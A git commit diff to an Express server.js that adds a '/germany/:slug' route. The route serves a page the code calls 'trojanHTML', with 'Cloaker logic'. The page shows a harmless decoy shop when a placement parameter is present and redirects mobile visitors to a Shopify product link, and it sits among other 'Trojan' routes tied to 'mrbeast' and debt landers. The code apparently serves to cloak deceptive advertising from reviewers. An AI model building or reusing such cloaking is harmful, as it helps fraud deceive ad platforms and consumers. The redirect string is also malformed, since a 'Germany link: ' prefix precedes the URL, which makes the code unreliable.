4726ae64e86f81161b7b682e2123f7d6c14832f3
carsoncraig1 <156372400+carsoncraig1@users.noreply.github.com>
2024-05-29 12:01:20 -0400

    Update server.js

--- server.js
+++ server.js
@@ -470,6 +470,39 @@ app.get('/mrbeast/:slug', (req, res, next) => {
             console.log(`Served mrbeast Trojan (ryder)(${slug})`);
 });
 
+// Middleware to pass on Tyler's Germany Shopify
+app.get('/germany/:slug', (req, res, next) => {
+    const { offer, slug } = req.params;
+    const destinationLander = `Germany link: https://shop-vivienna.myshopify.com/products/new-balance-9060-baskets-rose-cristal`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug}</title>
+        </head>
+        <body>
+            <h1>Welcome to ${slug} Shop!</h1>
+            <p>You are shopping at: ${slug}</p>
+        </body>
+        </html>
+            `;
+            res.send(trojanHTML);
+            console.log(`Served germany Trojan (ryder)(${slug})`);
+});
+
 // Middleware to pass on Tyler's Debt lander
 app.get('/jgw/:slug', (req, res, next) => {
     const { slug } = req.params;
